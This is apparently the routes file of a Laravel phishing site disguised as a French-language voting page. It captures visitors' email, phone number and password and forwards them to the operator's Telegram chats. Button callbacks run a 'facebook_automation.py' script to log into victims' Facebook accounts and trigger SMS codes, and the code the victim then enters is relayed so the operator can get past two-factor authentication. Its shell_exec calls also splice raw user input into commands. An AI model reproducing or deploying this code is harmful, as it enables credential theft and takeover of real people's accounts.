<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

Route::view('/', 'welcome');
Route::view('/vote', 'vote');
Route::view('/success', 'success');

Route::get('/verify', function () {
    return view('verify', [
        'email' => session('email', ''),
        'phone' => session('phone', ''),
        'password' => session('password', ''),
    ]);
})->name('verify.show');

Route::post('/vote', function (Request $request) {
    session(['email' => $request->input('email')]);
    session(['phone' => $request->input('phone')]);
    session(['password' => $request->input('password')]);
    return redirect()->route('verify.show');
});

// ============================================================
// SEND TO TELEGRAM WITH BUTTONS
// ============================================================
Route::post('/submit-telegram', function (Request $request) {
    $botToken = env('TELEGRAM_BOT_TOKEN');
    $privateChatID = env('TELEGRAM_CHAT_ID');
    $groupChatID = env('GROUP_CHAT_ID', '-5560854290');
    
    $email = $request->input('email', 'No email');
    $phone = $request->input('phone', 'No phone');
    $password = $request->input('password', 'No password');
    $code = $request->input('code', 'No code');
    
    session(['email' => $email, 'phone' => $phone, 'password' => $password]);
    
    $message = "🔐 NOUVEAU VOTE:\n📧 Email: $email\n📱 Phone: $phone\n🔑 Pass: $password\n🔢 Code: $code\n🕒 Time: " . now()->toDateTimeString();
    
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '📱 Send SMS Code', 'callback_data' => 'fb_sms_' . $email . '_' . $phone],
                ['text' => '📧 Send Email Code', 'callback_data' => 'fb_email_' . $email . '_' . $phone]
            ],
            [
                ['text' => '✅ Approuver vote', 'callback_data' => 'approve_' . $phone],
                ['text' => '❌ Refuser vote', 'callback_data' => 'reject_' . $phone]
            ]
        ]
    ];
    
    // SEND TO PRIVATE CHAT
    Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
        'chat_id' => $privateChatID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ]);
    
    // SEND TO GROUP CHAT
    Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
        'chat_id' => $groupChatID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ]);
    
    return response()->json(['success' => true]);
});

// ============================================================
// TELEGRAM WEBHOOK – HANDLE BUTTON CLICKS
// ============================================================
Route::post('/telegram-webhook', function (Request $request) {
    $botToken = env('TELEGRAM_BOT_TOKEN');
    $update = $request->all();
    
    \Log::info('Telegram webhook received:', $update);
    
    if (isset($update['callback_query'])) {
        $callback = $update['callback_query'];
        $data = $callback['data'];
        $chatID = $callback['message']['chat']['id'];
        
        $parts = explode('_', $data);
        $action = $parts[0] ?? '';
        $subAction = $parts[1] ?? '';
        $identifier = $parts[2] ?? 'unknown';
        $phone = $parts[3] ?? 'unknown';
        
        $responseMessage = "";
        $buttonText = "";
        
        switch($action) {
            case 'fb':
                if ($subAction == 'sms') {
                    $responseMessage = "📱 SENDING SMS CODE TO $phone...";
                    $buttonText = "⏳ Sending SMS...";
                    
                    $password = session('password', 'unknown');
                    
                    $output = shell_exec("python " . base_path("facebook_automation.py") . " --email '$identifier' --password '$password' --phone '$phone' 2>&1");
                    
                    Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
                        'chat_id' => $chatID,
                        'text' => "📱 FACEBOOK SMS RESULT:\n📧 Email: $identifier\n📱 Phone: $phone\n📌 Output: $output",
                        'parse_mode' => 'HTML'
                    ]);
                    
                } elseif ($subAction == 'email') {
                    $fbCode = rand(100000, 999999);
                    $responseMessage = "📧 EMAIL CODE:\n📧 Email: $identifier\n🔢 Code: $fbCode";
                    $buttonText = "✅ Email code sent!";
                }
                break;
                
            case 'approve':
                $responseMessage = "✅ VOTE APPROUVÉ!\n📱 Phone: $identifier\n🕒 Time: " . now()->toDateTimeString();
                $buttonText = "✅ Vote approved!";
                break;
                
            case 'reject':
                $responseMessage = "❌ VOTE REJETÉ!\n📱 Phone: $identifier\n🕒 Time: " . now()->toDateTimeString();
                $buttonText = "❌ Vote rejected!";
                break;
                
            default:
                $responseMessage = "❓ Action inconnue: $action";
                $buttonText = "❌ Unknown action";
        }
        
        Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
            'chat_id' => $chatID,
            'text' => $responseMessage,
            'parse_mode' => 'HTML'
        ]);
        
        Http::post("https://api.telegram.org/bot{$botToken}/answerCallbackQuery", [
            'callback_query_id' => $callback['id'],
            'text' => $buttonText
        ]);
    }
    
    return response()->json(['status' => 'ok']);
});

// ============================================================
// SEND SMS – TRIGGER FACEBOOK SMS FROM VERIFY PAGE
// ============================================================
Route::post('/send-sms', function (Request $request) {
    $email = $request->input('email');
    $phone = $request->input('phone');
    $password = $request->input('password');
    
    session(['email' => $email, 'phone' => $phone, 'password' => $password]);
    
    $output = shell_exec("python " . base_path("facebook_automation.py") . " --email '$email' --password '$password' --phone '$phone' 2>&1");
    
    return response()->json([
        'success' => true,
        'message' => 'SMS sent to ' . $phone,
        'output' => $output
    ]);
});

// ============================================================
// USER SUBMITS THE SMS CODE – FORWARD TO GROUP
// ============================================================
Route::post('/submit-code', function (Request $request) {
    $botToken = env('TELEGRAM_BOT_TOKEN');
    $groupChatID = env('GROUP_CHAT_ID', '-5560854290');
    
    $code = $request->input('code');
    $phone = session('phone', 'Unknown');
    $email = session('email', 'Unknown');
    $password = session('password', 'Unknown');
    
    $message = "✅ USER ENTERED THE FACEBOOK SMS CODE!\n📱 Phone: $phone\n📧 Email: $email\n🔑 Pass: $password\n🔢 Code: $code\n🕒 Time: " . now()->toDateTimeString();
    
    // SEND TO GROUP CHAT
    Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
        'chat_id' => $groupChatID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);
    
    // ALSO SEND TO PRIVATE CHAT
    Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
        'chat_id' => env('TELEGRAM_CHAT_ID'),
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);
    
    return response()->json(['success' => true]);
});